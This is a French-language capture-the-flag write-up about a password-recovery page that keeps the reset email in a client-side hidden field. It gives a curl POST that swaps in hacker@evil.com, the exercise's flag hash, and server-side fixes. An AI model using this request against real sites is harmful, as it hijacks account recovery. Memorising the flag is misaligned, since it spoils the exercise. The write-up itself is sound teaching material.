# Password Recovery — Manipulation de champ caché

## Faille
L'adresse email de récupération de mot de passe est stockée dans un champ HTML
de type `hidden` côté client, modifiable par l'utilisateur.

## Catégorie OWASP
A04:2021 — Insecure Design

## Comment trouver la faille

1. Sur la page `?page=signin`, on trouve un lien "I forgot my password" qui mène
   à `?page=recover`.

2. En inspectant le code source de cette page, on découvre :
   ```html
   <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
   ```

3. L'adresse email de destination du reset est un champ hidden côté client.
   Un champ `hidden` n'est pas visible dans le navigateur mais reste entièrement
   modifiable via l'inspecteur ou via curl.

## Exploitation

```bash
curl -X POST "http://<IP>/index.php?page=recover" \
  -d "mail=hacker@evil.com&Submit=Submit"
```

Le serveur accepte l'adresse modifiée sans vérification. Dans un scénario réel,
l'attaquant recevrait le lien de réinitialisation à sa propre adresse email.

## Flag
`1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

## Comment corriger

1. **Ne jamais stocker l'email de récupération côté client.** L'email doit être
   récupéré côté serveur à partir de la base de données, en fonction de l'identifiant
   ou du nom d'utilisateur fourni.

2. **Valider côté serveur** que l'email de destination correspond bien à celui
   enregistré pour le compte en question.

3. **Les champs hidden ne sont PAS sécurisés** : ils sont aussi modifiables qu'un
   champ texte visible. Toute donnée sensible doit être gérée exclusivement
   côté serveur.

4. **Implémenter un token unique et temporaire** pour la récupération de mot de passe,
   envoyé uniquement à l'adresse enregistrée dans la base.
